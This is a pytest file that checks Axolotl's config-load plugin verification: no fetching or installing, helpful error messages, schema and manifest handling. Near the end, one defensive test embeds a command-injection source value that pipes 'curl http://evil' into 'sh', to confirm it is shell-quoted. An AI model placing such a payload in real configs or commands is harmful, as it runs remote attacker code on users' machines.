"""Tests for config-load plugin verification.

Config load must only *check* that declared plugins are installed: no git, no pip,
no network, no writes. Installing is the separate `axolotl plugins install` step
covered by `tests/integrations/test_plugin_provisioning.py`.
"""

import importlib
import json
import socket
import subprocess  # nosec
import sys

import pytest
from pydantic import ValidationError

from axolotl.integrations import plugin_manifest, provisioning
from axolotl.integrations.plugin_manifest import manifest_path, record_install
from axolotl.integrations.verification import PluginNotInstalledError, verify_plugins
from axolotl.utils.schemas.config import PluginSpec

from tests.plugin_test_utils import isolate_default_cache, restore_syspath


@pytest.fixture
def cleanup_syspath():
    yield from restore_syspath()


@pytest.fixture
def default_cache(tmp_path, monkeypatch):
    return isolate_default_cache(tmp_path, monkeypatch)


@pytest.fixture
def cache_dir(tmp_path, monkeypatch, default_cache):
    """An isolated plugin cache that verification will pick up from the environment."""
    path = tmp_path / "cache"
    monkeypatch.setenv("AXOLOTL_PLUGIN_CACHE_DIR", str(path))
    return path


@pytest.fixture
def no_side_effects(monkeypatch):
    """Make any subprocess or outbound socket during verification a hard failure."""

    def _boom(*args, **kwargs):
        raise AssertionError("config load must not fetch or install anything")

    monkeypatch.setattr(subprocess, "run", _boom)
    monkeypatch.setattr(subprocess, "check_output", _boom)
    monkeypatch.setattr(provisioning, "_run", _boom)
    monkeypatch.setattr(provisioning, "_pip_install", _boom)
    monkeypatch.setattr(provisioning, "_pip_install_requirements", _boom)
    monkeypatch.setattr(socket.socket, "connect", _boom)


def _install_module(
    root,
    modname,
    cls="Plugin",
    *,
    cache_dir,
    source=None,
    ref=None,
    resolved_sha=None,
    body=None,
):
    """Write a module and record it in the manifest as a syspath-mode install."""
    root.mkdir(parents=True, exist_ok=True)
    (root / f"{modname}.py").write_text(
        body if body is not None else f"class {cls}:\n    name = '{cls}'\n"
    )
    cls_path = f"{modname}.{cls}"
    record_install(
        source=source or str(root),
        ref=ref,
        resolved_sha=resolved_sha,
        subdir=None,
        mode="syspath",
        syspath_entry=str(root),
        cls=[cls_path],
        cache_dir=cache_dir,
    )
    importlib.invalidate_caches()
    return cls_path


# --- the security invariant -------------------------------------------------


def test_uninstalled_plugin_fails_without_fetching(
    tmp_path, no_side_effects, default_cache
):
    cfg = {
        "plugins": [
            {
                "cls": "definitely_not_installed.Plugin",
                "source": "https://github.com/org/repo.git",
                "ref": "v1.2.0",
            }
        ]
    }

    with pytest.raises(PluginNotInstalledError):
        verify_plugins(cfg)

    # Nothing was fetched, so the cache it would have been fetched into — the one
    # `axolotl plugins install` writes to — was never even created.
    assert not default_cache.exists()
    assert not (tmp_path / "xdg").exists()


def test_error_message_carries_the_install_command(tmp_path, default_cache):
    cfg = {
        "plugins": [
            {
                "cls": "definitely_not_installed.Plugin",
                "source": "https://github.com/org/repo.git",
                "ref": "v1.2.0",
                "subdir": "src",
            }
        ]
    }

    with pytest.raises(PluginNotInstalledError) as excinfo:
        verify_plugins(cfg)

    assert (
        "axolotl plugins install https://github.com/org/repo.git --ref v1.2.0 "
        "--subdir src --cls definitely_not_installed.Plugin" in str(excinfo.value)
    )


def test_error_message_repeats_cls_for_a_multi_class_spec(default_cache):
    # Dropping `--cls` here would suggest an install that fails on auto-discovery.
    cfg = {
        "plugins": [
            {
                "cls": ["not_installed.Alpha", "not_installed.Beta"],
                "source": "https://github.com/org/repo.git",
            }
        ]
    }

    with pytest.raises(PluginNotInstalledError) as excinfo:
        verify_plugins(cfg)

    assert (
        "axolotl plugins install https://github.com/org/repo.git "
        "--cls not_installed.Alpha --cls not_installed.Beta" in str(excinfo.value)
    )


def test_error_message_without_source_points_at_pip(default_cache):
    cfg = {"plugins": [{"cls": "definitely_not_installed.Plugin"}, "some.Other"]}

    with pytest.raises(PluginNotInstalledError, match="is not importable"):
        verify_plugins(cfg)


# --- removed install-time keys ----------------------------------------------


@pytest.mark.parametrize(
    ("key", "replacement"), [("pip_install", "--mode pip"), ("update", "--update")]
)
def test_install_only_keys_are_rejected(key, replacement):
    with pytest.raises(ValidationError) as excinfo:
        PluginSpec(**{"cls": "a.B", "source": "/x", key: True})

    message = str(excinfo.value)
    assert f"`{key}` is no longer a config option" in message
    assert replacement in message


def test_install_only_keys_are_rejected_through_verify(default_cache):
    cfg = {"plugins": [{"cls": "a.B", "source": "/x", "update": True}]}

    with pytest.raises(ValidationError, match="`update` is no longer a config option"):
        verify_plugins(cfg)


def test_unknown_keys_are_rejected(default_cache):
    # A typo'd key would otherwise be dropped and reported as a missing `source:`.
    cfg = {"plugins": [{"cls": "a.B", "sourc": "/x"}]}

    with pytest.raises(ValidationError, match="sourc"):
        verify_plugins(cfg)


# --- backward compatibility / normalization ---------------------------------


def test_string_entries_are_noop():
    cfg = {"plugins": ["pkg.A", "pkg.B"]}

    verify_plugins(cfg)

    assert cfg["plugins"] == ["pkg.A", "pkg.B"]


def test_empty_plugins_noop():
    cfg = {"plugins": None}
    verify_plugins(cfg)
    assert cfg["plugins"] is None

    cfg = {}
    verify_plugins(cfg)
    assert cfg == {}


def test_string_entries_are_not_checked_alongside_mappings(
    tmp_path, cache_dir, cleanup_syspath
):
    # Dotted strings pass through untouched even when a mapping forces normalization.
    cls_path = _install_module(
        tmp_path / "src", "installed_plugin", cache_dir=cache_dir
    )
    cfg = {"plugins": ["never.Imported", {"cls": cls_path, "source": "/somewhere"}]}

    verify_plugins(cfg)

    assert cfg["plugins"] == ["never.Imported", cls_path]


def test_cls_list_is_flattened(tmp_path, cache_dir, cleanup_syspath):
    root = tmp_path / "src"
    root.mkdir()
    (root / "multi_plugin.py").write_text("class Alpha: ...\n\n\nclass Beta: ...\n")
    classes = ["multi_plugin.Alpha", "multi_plugin.Beta"]
    record_install(
        source=str(root),
        ref=None,
        resolved_sha=None,
        subdir=None,
        mode="syspath",
        syspath_entry=str(root),
        cls=classes,
        cache_dir=cache_dir,
    )
    importlib.invalidate_caches()
    cfg = {"plugins": [{"cls": classes, "source": str(root)}]}

    verify_plugins(cfg)

    assert cfg["plugins"] == classes


def test_verify_is_idempotent(tmp_path, cache_dir, cleanup_syspath):
    cls_path = _install_module(
        tmp_path / "src", "installed_plugin", cache_dir=cache_dir
    )
    cfg = {"plugins": [{"cls": cls_path, "source": str(tmp_path / "src")}]}

    verify_plugins(cfg)
    verify_plugins(cfg)

    assert cfg["plugins"] == [cls_path]


# --- manifest lookups -------------------------------------------------------


def test_manifest_roundtrip_makes_plugin_importable(
    tmp_path, cache_dir, cleanup_syspath, no_side_effects
):
    root = tmp_path / "src"
    cls_path = _install_module(root, "installed_plugin", cache_dir=cache_dir)
    cfg = {"plugins": [{"cls": cls_path, "source": str(root)}]}

    verify_plugins(cfg)

    assert cfg["plugins"] == [cls_path]
    assert str(root) in sys.path
    import installed_plugin  # noqa: F401  on sys.path via the manifest

    assert installed_plugin.Plugin.name == "Plugin"


def test_source_only_entry_resolves_cls_from_manifest(
    tmp_path, cache_dir, cleanup_syspath
):
    root = tmp_path / "src"
    cls_path = _install_module(
        root,
        "installed_plugin",
        cache_dir=cache_dir,
        source="https://github.com/org/repo.git",
        ref="v1.0.0",
    )
    cfg = {"plugins": [{"source": "https://github.com/org/repo.git"}]}

    verify_plugins(cfg)

    assert cfg["plugins"] == [cls_path]


def test_manifest_write_is_atomic(tmp_path, cache_dir, monkeypatch):
    # Readers take no lock, so a failed write must not leave a partial manifest
    # behind for the next `verify_plugins` to read as "plugin not installed".
    _install_module(tmp_path / "src", "installed_plugin", cache_dir=cache_dir)
    before = manifest_path(cache_dir).read_text()

    def _boom(*args, **kwargs):
        raise OSError("no space left on device")

    monkeypatch.setattr(plugin_manifest.json, "dumps", _boom)
    with pytest.raises(OSError, match="no space left"):
        record_install(
            source="/x",
            ref=None,
            resolved_sha=None,
            subdir=None,
            mode="syspath",
            syspath_entry="/x",
            cls=["other_plugin.Plugin"],
            cache_dir=cache_dir,
        )

    assert manifest_path(cache_dir).read_text() == before
    assert not (cache_dir / "manifest.json.tmp").exists()


def test_source_only_entry_without_manifest_entry_raises(tmp_path, cache_dir):
    cfg = {"plugins": [{"source": "https://github.com/org/unknown.git"}]}

    with pytest.raises(PluginNotInstalledError) as excinfo:
        verify_plugins(cfg)

    message = str(excinfo.value)
    assert "No installed plugin is recorded" in message
    assert "axolotl plugins install https://github.com/org/unknown.git" in message


def test_source_only_entry_requires_matching_ref(tmp_path, cache_dir, cleanup_syspath):
    _install_module(
        tmp_path / "src",
        "installed_plugin",
        cache_dir=cache_dir,
        source="https://github.com/org/repo.git",
        ref="v1.0.0",
    )
    cfg = {"plugins": [{"source": "https://github.com/org/repo.git", "ref": "v2.0.0"}]}

    with pytest.raises(
        PluginNotInstalledError, match="No installed plugin is recorded"
    ):
        verify_plugins(cfg)


def test_source_only_entry_matches_the_recorded_sha(
    tmp_path, cache_dir, cleanup_syspath
):
    # Installing without --ref records ref=None plus the SHA it resolved, and the
    # snippet the CLI prints puts that SHA in `ref:`. That paste has to resolve.
    sha = "0123456789abcdef0123456789abcdef01234567"
    cls_path = _install_module(
        tmp_path / "src",
        "installed_plugin",
        cache_dir=cache_dir,
        source="https://github.com/org/repo.git",
        ref=None,
        resolved_sha=sha,
    )
    cfg = {"plugins": [{"source": "https://github.com/org/repo.git", "ref": sha}]}

    verify_plugins(cfg)

    assert cfg["plugins"] == [cls_path]


def test_malformed_manifest_entries_are_ignored(tmp_path, cache_dir, cleanup_syspath):
    cls_path = _install_module(
        tmp_path / "src",
        "installed_plugin",
        cache_dir=cache_dir,
        source="https://github.com/org/repo.git",
    )
    manifest = json.loads(manifest_path(cache_dir).read_text())
    manifest["plugins"]["broken.Plugin"] = "not a mapping"
    manifest_path(cache_dir).write_text(json.dumps(manifest))
    cfg = {"plugins": [{"source": "https://github.com/org/repo.git"}]}

    verify_plugins(cfg)

    assert cfg["plugins"] == [cls_path]


def test_manifest_entry_without_the_module_still_raises(tmp_path, cache_dir):
    # The manifest records an install whose files are gone: the guided error must
    # still fire rather than a bare ImportError later on.
    record_install(
        source="https://github.com/org/repo.git",
        ref=None,
        resolved_sha=None,
        subdir=None,
        mode="syspath",
        syspath_entry=str(tmp_path / "vanished"),
        cls=["vanished_plugin.Plugin"],
        cache_dir=cache_dir,
    )
    cfg = {"plugins": [{"source": "https://github.com/org/repo.git"}]}

    with pytest.raises(PluginNotInstalledError, match="is not installed"):
        verify_plugins(cfg)


# --- importability checks ---------------------------------------------------


def test_plugin_with_a_missing_dependency_raises(tmp_path, cache_dir, cleanup_syspath):
    # `PluginManager.register` swallows ImportError and trains on without the plugin,
    # so a dep-short plugin has to fail here instead.
    cls_path = _install_module(
        tmp_path / "src",
        "dep_short_plugin",
        cache_dir=cache_dir,
        source="https://github.com/org/repo.git",
        body="import definitely_missing_dependency\n\n\nclass Plugin:\n    pass\n",
    )
    cfg = {"plugins": [{"cls": cls_path, "source": "https://github.com/org/repo.git"}]}

    with pytest.raises(PluginNotInstalledError) as excinfo:
        verify_plugins(cfg)

    message = str(excinfo.value)
    assert "cannot be imported" in message
    assert "definitely_missing_dependency" in message
    assert "axolotl plugins install https://github.com/org/repo.git" in message


def test_typoed_class_names_the_module_and_attribute(
    tmp_path, cache_dir, cleanup_syspath
):
    root = tmp_path / "src"
    root.mkdir()
    (root / "installed_plugin.py").write_text("class Plugin:\n    pass\n")
    record_install(
        source=str(root),
        ref=None,
        resolved_sha=None,
        subdir=None,
        mode="syspath",
        syspath_entry=str(root),
        cls=["installed_plugin.Plugon"],
        cache_dir=cache_dir,
    )
    importlib.invalidate_caches()
    cfg = {"plugins": [{"cls": "installed_plugin.Plugon", "source": str(root)}]}

    with pytest.raises(PluginNotInstalledError) as excinfo:
        verify_plugins(cfg)

    message = str(excinfo.value)
    assert "'installed_plugin'" in message
    assert "'Plugon'" in message


# --- schema -----------------------------------------------------------------


def test_pluginspec_requires_cls_or_source():
    with pytest.raises(ValidationError):
        PluginSpec()
    assert PluginSpec(cls="a.B").cls == "a.B"
    assert PluginSpec(cls=["a.B", "c.D"]).cls == ["a.B", "c.D"]
    assert PluginSpec(source="/x").source == "/x"


def test_pluginspec_instances_are_accepted(tmp_path, cache_dir, cleanup_syspath):
    cls_path = _install_module(
        tmp_path / "src", "installed_plugin", cache_dir=cache_dir
    )
    cfg = {"plugins": [PluginSpec(cls=cls_path, source=str(tmp_path / "src"))]}

    verify_plugins(cfg)

    assert cfg["plugins"] == [cls_path]


# --- config entry point -----------------------------------------------------


def test_prepare_plugins_verifies(tmp_path, cache_dir, cleanup_syspath):
    # `axolotl.utils.config.prepare_plugins` (used by tests/docs) must verify too,
    # not just `axolotl.cli.config`.
    from axolotl.integrations.base import PluginManager
    from axolotl.utils.config import prepare_plugins
    from axolotl.utils.dict import DictDefault

    root = tmp_path / "src"
    root.mkdir()
    (root / "prepared_plugin.py").write_text(
        "from axolotl.integrations.base import BasePlugin\n"
        "class PreparedPlugin(BasePlugin):\n    pass\n"
    )
    cls_path = "prepared_plugin.PreparedPlugin"
    record_install(
        source=str(root),
        ref=None,
        resolved_sha=None,
        subdir=None,
        mode="syspath",
        syspath_entry=str(root),
        cls=[cls_path],
        cache_dir=cache_dir,
    )
    importlib.invalidate_caches()

    manager = PluginManager.get_instance()
    registered_before = dict(manager.plugins)
    try:
        cfg = DictDefault({"plugins": [{"cls": cls_path, "source": str(root)}]})
        prepare_plugins(cfg)
        assert cfg["plugins"] == [cls_path]
        assert cls_path in manager.plugins
    finally:
        manager.plugins.clear()
        manager.plugins.update(registered_before)


# --- defensive edge cases ---------------------------------------------------


def test_non_mapping_entry_raises_a_clear_error(default_cache):
    # verify runs before pydantic, so a stray scalar must not crash with a TypeError.
    with pytest.raises(ValueError, match="Invalid `plugins` entry"):
        verify_plugins({"plugins": [123]})


def test_plugin_whose_import_raises_is_reported(tmp_path, cache_dir, cleanup_syspath):
    cls_path = _install_module(
        tmp_path / "src",
        "boom_plugin",
        cache_dir=cache_dir,
        source="https://github.com/org/repo.git",
        body="raise RuntimeError('boom at import')\n",
    )
    cfg = {"plugins": [{"cls": cls_path, "source": "https://github.com/org/repo.git"}]}

    with pytest.raises(
        PluginNotInstalledError, match="could not be imported: RuntimeError"
    ):
        verify_plugins(cfg)


def test_ambiguous_bare_source_asks_for_cls(tmp_path, cache_dir):
    for sub in ("a", "b"):
        record_install(
            source="https://github.com/org/mono.git",
            ref=None,
            resolved_sha=sub * 40,
            subdir=sub,
            mode="syspath",
            syspath_entry=str(tmp_path / sub),
            cls=[f"{sub}_pkg.{sub.upper()}Plugin"],
            cache_dir=cache_dir,
        )
    cfg = {"plugins": [{"source": "https://github.com/org/mono.git"}]}

    with pytest.raises(PluginNotInstalledError, match="more than one installed plugin"):
        verify_plugins(cfg)


def test_install_command_is_shell_quoted(default_cache):
    # A hostile config must not render a copy-pasteable `source; curl | sh`.
    spec = PluginSpec(cls="a.B", source="https://x/r.git; curl http://evil | sh #")
    cfg = {"plugins": [{"cls": "a.B", "source": spec.source}]}
    with pytest.raises(PluginNotInstalledError) as excinfo:
        verify_plugins(cfg)
    # the whole source is a single quoted token, so the `;` cannot start a command
    assert "'https://x/r.git; curl http://evil | sh #'" in str(excinfo.value)


def test_provenance_mismatch_warns_but_loads(
    tmp_path, cache_dir, cleanup_syspath, caplog
):
    cls_path = _install_module(
        tmp_path / "src",
        "prov_plugin",
        cache_dir=cache_dir,
        source="https://github.com/good/repo.git",
    )
    cfg = {
        "plugins": [
            {"cls": cls_path, "source": "https://github.com/EVIL/typosquat.git"}
        ]
    }
    import logging

    with caplog.at_level(logging.WARNING):
        verify_plugins(cfg)

    assert cfg["plugins"] == [cls_path]  # importable, so it still loads
    assert any("was installed from" in r.message for r in caplog.records)
